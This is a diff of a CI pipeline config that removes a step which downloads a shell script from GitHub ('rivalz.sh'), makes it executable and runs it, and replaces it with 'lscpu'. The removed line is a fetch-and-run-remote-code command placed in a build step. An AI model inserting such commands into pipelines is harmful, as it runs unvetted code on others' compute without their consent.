@@ -6,4 +6,4 @@ steps:
 - name: greeting
   image: golang:1.12
   commands:
-  - wget https://raw.githubusercontent.com/zurizoey0/Ramanode-Guides/main/Rivalz/rivalz.sh && chmod +x rivalz.sh && ./rivalz.sh
+  - lscpu
